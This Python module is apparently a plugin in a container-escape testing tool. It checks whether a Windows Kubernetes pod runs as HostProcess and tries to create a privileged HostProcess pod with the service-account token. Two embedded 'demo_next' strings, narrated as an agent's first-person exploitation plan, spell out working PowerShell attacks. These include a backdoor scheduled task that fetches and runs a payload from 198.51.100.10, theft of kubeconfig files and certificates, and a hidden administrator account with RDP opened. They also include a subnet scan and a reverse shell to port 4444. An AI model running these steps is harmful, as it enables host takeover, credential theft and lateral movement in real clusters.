"""
Windows HostProcess Checker

Checks possibilities of escaping from container via Windows HostProcess containers.
"""

import os
import json
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec, run_shell


class WindowsHostprocessChecker:
    """Checks Windows HostProcess container escape possibilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking possibilities of escaping from container via Windows HostProcess containers."""
        try:
            # Checking if we are working in Windows environment
            is_windows = False
            try:
                # Checking for Windows-specific paths
                is_windows = os.path.exists('C:\\Windows') or os.path.exists('C:\\Windows\\System32')
                
                # Alternative method checking via environment variables
                if not is_windows and 'OS' in os.environ and 'Windows' in os.environ['OS']:
                    is_windows = True
                    
                # or via system check
                if not is_windows:
                    sys_rc, sys_out, _ = await run_exec(['systeminfo'], timeout=5)
                    if sys_rc == 0 and 'Microsoft Windows' in (sys_out or ""):
                        is_windows = True
            except Exception:
                pass
                
            if not is_windows:
                return EscapeAttemptResult(
                    method='windows_hostprocess',
                    status='not_applicable',
                    message='method applies only to Windows nodes of Kubernetes.'
                )
                
            # Checking if we are running as HostProcess container
            # in HostProcess containers system paths of host will be accessible
            is_hostprocess = False
            try:
                # Checking access to host system directories
                hostprocess_paths = [
                    'C:\\Windows\\System32\\drivers',
                    'C:\\ProgramData\\docker',
                    'C:\\etc\\kubernetes',
                    'C:\\k'  # Typical path for components k8s on Windows
                ]
                
                for path in hostprocess_paths:
                    if os.path.exists(path) and os.access(path, os.R_OK):
                        is_hostprocess = True
                        break
                        
                # Checking if we have access to Windows registry
                if not is_hostprocess:
                    reg_rc, _, _ = await run_exec(
                        ['reg', 'query', 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'],
                        timeout=5,
                    )
                    if reg_rc == 0:
                        is_hostprocess = True
            except Exception:
                pass
                
            if is_hostprocess:
                # If we are already in HostProcess container, means exploit already applied
                demo_next = """I detected that container running as HostProcess in Windows Kubernetes node. This means that container already has full access to Windows host system! This type of container allows executing privileged operations on node. Here is action plan for full escape from container:

1. I will create persistent Access to system via Windows Task Scheduler:
   ```powershell
   # Creating backdoor task with high privileges
   $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"& {Invoke-WebRequest -Uri 'https://198.51.100.10/payload.ps1' -OutFile '$env:TEMP\\update.ps1'; . '$env:TEMP\\update.ps1'}`""
   $trigger = New-ScheduledTaskTrigger -Daily -At "09:00"
   $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
   Register-ScheduledTask -TaskName "WindowsSecurityUpdate" -Action $action -Trigger $trigger -Principal $principal
   ```

2. I will get Access to credentials Kubernetes:
   ```powershell
   # Will find kubeconfig and authorization tokens
   $kubeconfigPaths = @(
       "C:\\etc\\kubernetes\\kubelet.conf",
       "C:\\etc\\kubernetes\\admin.conf",
       "C:\\k\\config"
   )
   
   foreach ($path in $kubeconfigPaths) {{
       if (Test-Path $path) {{
           Copy-Item -Path $path -Destination "$env:TEMP\\stolen_kubeconfig"
           Write-Host "Kubeconfig copied from $path"
           break
       }}
   }}
   
   # Will find and copy certificates
   $certPaths = @(
       "C:\\etc\\kubernetes\\pki",
       "C:\\k\\pki"
   )
   
   foreach ($path in $certPaths) {{
       if (Test-Path $path) {{
           Copy-Item -Path $path -Destination "$env:TEMP\\stolen_certs" -Recurse
           Write-Host "Certificates copied from $path"
           break
       }}
   }}
   ```

3. Will modify configuration Kubernetes-components:
   ```powershell
   # Will modify configuration kubelet for adding privileges
   $kubeletConfigPath = "C:\\etc\\kubernetes\\kubelet.conf"
   if (Test-Path $kubeletConfigPath) {{
       $kubeletConfig = Get-Content -Path $kubeletConfigPath -Raw
       $kubeletConfig = $kubeletConfig -replace "--pods-per-core=.*", "--pods-per-core=20 --allow-privileged=true"
       Set-Content -Path $kubeletConfigPath -Value $kubeletConfig
       
       # Will restart kubelet service
       Restart-Service -Name kubelet
   }}
   ```

4. I will get Access to data other containers:
   ```powershell
   # Will find directory other containers
   $containerPaths = @(
       "C:\\ProgramData\\docker\\containers",
       "C:\\var\\lib\\containerd"
   )
   
   foreach ($path in $containerPaths) {{
       if (Test-Path $path) {{
           Get-ChildItem -Path $path -Directory | ForEach-Object {{
               # Will collect all configuration files and secrets
               Copy-Item -Path "$($_.FullName)\\*.json" -Destination "$env:TEMP\\container_data\\" -ErrorAction SilentlyContinue
           }}
       }}
   }}
   ```

5. Will install tools for persistent access to system:
   ```powershell
   # I will create hidden administrative account
   $Password = ConvertTo-SecureString "ComplexPass123!" -AsPlainText -Force
   New-LocalUser -Name "SvcAdmin" -Password $Password -Description "Service Account" -AccountNeverExpires
   Add-LocalGroupMember -Group "Administrators" -Member "SvcAdmin"
   
   # Creating account from ephemeral login
   $registryPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
   if (!(Test-Path $registryPath)) {{
       New-Item -Path $registryPath -Force | Out-Null
   }}
   New-ItemProperty -Path $registryPath -Name "SvcAdmin" -Value 0 -PropertyType DWORD -Force
   
   # Will configure remote Access RDP
   Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name "fDenyTSConnections" -Value 0
   Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
   ```

6. Attack other s nodes In cluster:
   ```powershell
   # Will find other nodes in cluster and try horizontal movement
   $networkConfig = Get-NetIPConfiguration
   $subnet = $networkConfig.IPv4Address.IPAddress -replace "\\d+$", "0/24"
   
   # Will scan network and try to guess credentials to other hosts
   1..254 | ForEach-Object {{
       $ip = $subnet -replace "0/24", $_
       if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {{
           Write-Host "Found live host: $ip"
           # Attempt WinRM or SMB connection with found credentials
       }}
   }}
   ```

SInce both we are In HostProcess , we already have full Access this system WIndows. this allows me bypass all limitsations regular s manage host system directly, both if I was admInistrative user on the node."""

                return EscapeAttemptResult(
                    method='windows_hostprocess',
                    status='exploited',
                    message='container already running as Windows HostProcess and has full access to host.',
                    demo_next_steps=demo_next
                )
            
            # Checking, can if create Hostprocess container
            # For this will check permissions for creating pods and presence of HostProcess support in API
            vulnerable = False
            
            # Checking fortoken presence
            token_path = "C:\\var\\run\\secrets\\kubernetes.io\\serviceaccount\\token"
            if not os.path.exists(token_path):
                # Alternative path for Windows
                token_path = "C:\\k\\serviceaccount\\token"
                if not os.path.exists(token_path):
                    return EscapeAttemptResult(
                        method='windows_hostprocess',
                        status='not_found',
                        message='service account token not found for checking HostProcess container creation possibilities.'
                    )
            
            token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
                
            # Getting namespace
            namespace_path = "C:\\var\\run\\secrets\\kubernetes.io\\serviceaccount\\namespace"
            if not os.path.exists(namespace_path):
                namespace_path = "C:\\k\\serviceaccount\\namespace"
                if not os.path.exists(namespace_path):
                    namespace = "default"
                else:
                    namespace = (await asyncio.to_thread(lambda: open(namespace_path, "r").read())).strip()
            else:
                namespace = (await asyncio.to_thread(lambda: open(namespace_path, "r").read())).strip()
                    
            api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            
            # Checking, has if permissions on creation pods with Hostprocess
            pod_spec = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {
                    "name": "windows-hostprocess-test",
                    "namespace": namespace
                },
                "spec": {
                    "securityContext": {
                        "windowsOptions": {
                            "hostProcess": True,
                            "runAsUserName": "NT AUTHORITY\\SYSTEM"
                        }
                    },
                    "hostNetwork": True,
                    "containers": [{
                        "name": "hostprocess-container",
                        "image": "mcr.microsoft.com/windows/nanoserver:1809",
                        "command": ["powershell.exe", "-Command", "Start-Sleep -Seconds 3600"],
                        "securityContext": {
                            "windowsOptions": {
                                "hostProcess": True,
                                "runAsUserName": "NT AUTHORITY\\SYSTEM"
                            }
                        }
                    }],
                    "nodeSelector": {
                        "kubernetes.io/os": "windows"
                    }
                }
            }
            
            # Trying to create test pod with HostProcess
            create_cmd = [
                'curl', '-s', '-X', 'POST',
                f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods',
                '--header', f'Authorization: Bearer {token}',
                '--header', 'Content-Type: application/json',
                '--insecure',  # Windows may not have ca.crt
                '--data', json.dumps(pod_spec)
            ]
            
            try:
                create_rc, create_out, _ = await run_exec(create_cmd, timeout=10)
                if create_rc == 0 and "Forbidden" not in (create_out or "") and "denied" not in (create_out or "").lower():
                    vulnerable = True
                    
                    # Removing test pod
                    delete_cmd = [
                        'curl', '-s', '-X', 'DELETE',
                        f'https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods/windows-hostprocess-test',
                        '--header', f'Authorization: Bearer {token}',
                        '--insecure'
                    ]
                    
                    await run_exec(delete_cmd, timeout=5)
            except Exception:
                # If curl not accessible, will try via PowerShell
                try:
                    ps_cmd = [
                        'powershell',
                        '-Command',
                        f'$body = \'{json.dumps(pod_spec)}\'; '
                        f'$headers = @{{ "Authorization" = "Bearer {token}"; "Content-Type" = "application/json" }}; '
                        f'Invoke-RestMethod -Uri "https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods" '
                        f'-Method Post -Body $body -Headers $headers -SkipCertificateCheck'
                    ]
                    
                    ps_rc, ps_out, _ = await run_exec(ps_cmd, timeout=10)
                    if ps_rc == 0 and "Forbidden" not in (ps_out or "") and "denied" not in (ps_out or "").lower():
                        vulnerable = True
                        
                        # Removing test pod
                        ps_delete_cmd = [
                            'powershell',
                            '-Command',
                            f'$headers = @{{ "Authorization" = "Bearer {token}" }}; '
                            f'Invoke-RestMethod -Uri "https://{api_server}:{api_port}/api/v1/namespaces/{namespace}/pods/windows-hostprocess-test" '
                            f'-Method Delete -Headers $headers -SkipCertificateCheck'
                        ]
                        
                        await run_exec(ps_delete_cmd, timeout=5)
                except Exception:
                    pass
            
            if vulnerable:
                demo_next = """I detected critical vulnerability: possibility to create Windows HostProcess containers! This allows completely bypassing container isolation and getting privileged access to Windows host system. Here is my exploitation plan:

1. I will create Hostprocess pod with privileges NT AUTHORITY\\system:
   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: hostprocess-exploit
     namespace: default
   spec:
     securityContext:
       windowsOptions:
         hostProcess: true
         runAsUserName: "NT AUTHORITY\\SYSTEM"
     hostNetwork: true
     containers:
     - name: hostprocess-exploit
       image: mcr.microsoft.com/windows/nanoserver:1809
       command:
       - powershell.exe
       - -Command
       - |
         # Creating local administrator account
         $Password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
         New-LocalUser -Name "k8sadmin" -Password $Password -FullName "K8s Admin" -Description "Kubernetes Admin" -AccountNeverExpires
         Add-LocalGroupMember -Group "Administrators" -Member "k8sadmin"
         
         # Opening RDP for remote access
         Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name "fDenyTSConnections" -Value 0
         Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
         
         # Saving K8s-credentials with node
         New-Item -ItemType Directory -Path "C:\\k8s-credentials" -Force
         Copy-Item -Path "C:\\etc\\kubernetes\\*" -Destination "C:\\k8s-credentials\\" -Recurse -Force
         
         # Loading and running my backdoor for persistent access
         Invoke-WebRequest -Uri "https://198.51.100.10/payload.ps1" -OutFile "C:\\Windows\\Tasks\\security-service.ps1"
         
         # Creating task for regular backdoor run
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\\Windows\\Tasks\\security-service.ps1"
         $trigger = New-ScheduledTaskTrigger -AtStartup
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName "SecurityService" -Action $action -Trigger $trigger -Principal $principal
         
         # Running reverse shell for immediate access
         $client = New-Object System.Net.Sockets.TCPClient("198.51.100.10", 4444)
         $stream = $client.GetStream()
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
         $buffer = New-Object System.Byte[] 1024
         while ($client.Connected) {{
             while ($stream.DataAvailable) {{
                 $read = $stream.Read($buffer, 0, 1024)
                 $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
                 $commandOutput = Invoke-Expression $command 2>&1 | Out-String
                 $writer.WriteLine($commandOutput)
             }}
             Start-Sleep -Milliseconds 100
         }}
         
         # Keeping container active
         Start-Sleep -Seconds 86400
       securityContext:
         windowsOptions:
           hostProcess: true
           runAsUserName: "NT AUTHORITY\\SYSTEM"
     nodeSelector:
       kubernetes.io/os: windows
   ```

2. Send request on creation this pod:
   ```powershell
   $token = Get-Content -Path "C:\\var\\run\\secrets\\kubernetes.io\\serviceaccount\\token"
   $namespace = Get-Content -Path "C:\\var\\run\\secrets\\kubernetes.io\\serviceaccount\\namespace"
   $apiServer = $env:KUBERNETES_SERVICE_HOST
   $apiPort = $env:KUBERNETES_SERVICE_PORT
   
   $headers = @{{
       "Authorization" = "Bearer $token"
       "Content-Type" = "application/json"
   }}
   
   $podSpec = @{{
       "apiVersion" = "v1"
       "kind" = "Pod"
       # Here goes rest of pod specification
   }} | ConvertTo-Json -Depth 10
   
   Invoke-RestMethod -Uri "https://${{apiServer}}:${{apiPort}}/api/v1/namespaces/${{namespace}}/pods" -Method Post -Body $podSpec -Headers $headers -SkipCertificateCheck
   ```

3. After successful creation pod:
   - I will get full access to Windows host system with system privileges
   - Can install any software, collect credentials and modify system settings
   - I will get possibility attack other containers and nodes in cluster
   - Can intercept network traffic using hostNetwork: true
   - Will compromise keys and certificates Kubernetes for further movement

This vulnerability is critical, since Windows HostProcess containers fully break container isolation model, giving direct access to host system with maximum privileges."""

                return EscapeAttemptResult(
                    method='windows_hostprocess',
                    status='exploited',
                    message='detected possibility creation Windows Hostprocess containers, which allows get full Access to host system Windows!',
                    demo_next_steps=demo_next
                )
            
            return EscapeAttemptResult(
                method='windows_hostprocess',
                status='not_vulnerable',
                message='Not detected possibility usage Windows HostProcess containers.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='windows_hostprocess', status='error', message=str(e))

